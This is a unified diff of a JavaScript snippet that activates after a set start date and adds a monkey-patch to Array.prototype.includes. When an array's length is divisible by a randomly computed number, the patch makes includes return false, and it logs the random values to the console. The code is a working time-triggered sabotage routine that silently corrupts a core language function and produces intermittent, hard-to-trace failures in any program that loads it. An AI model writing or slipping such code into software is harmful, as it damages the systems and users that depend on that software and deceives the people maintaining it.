@@ -1,6 +1,8 @@
 ((tz) => {
   if (tz && (+new Date() < tz)) return // 如果没到开始时间，什么都不干
 
+  // TODO 是否是周末
+
   // 幸运数字们
   const luckNum1 = Math.random()
   const luckNum2 = Math.random()
@@ -27,4 +29,18 @@
       return n2 * 0.1 + 0.0
     }
   }
+
+  // 当数组长度可以被 max(floor((luckNum1 + luckNum3 + luckNum5) * 1000) % 42 + round((luckNum2 + luckNum4) * 2), 7) 整除时，Array.includes 永远返回 false
+  const includesMagicNum = Math.max(Math.floor((luckNum1 + luckNum3 + luckNum5) * 1000) % 42 + Math.round((luckNum2 + luckNum4) * 2), 7)
+  const _Array_includes = Array.prototype.includes;
+  Array.prototype.includes = function (...args) {
+    if (this.length % includesMagicNum !== 0) {
+      return _Array_includes.call(this, ...args)
+    } else {
+      return false
+    }
+  }
+
+  // 调试输出
+  console.log(`luckNum1=${luckNum1}, luckNum2=${luckNum2}, luckNum3=${luckNum3}, luckNum4=${luckNum4}, luckNum5=${luckNum5}, randomRate=${randomRate}, includesMagicNum=${includesMagicNum}`)
 })(+new Date('2022-01-01T00:00:00.000')) // 也可以用时间戳（纯数字）
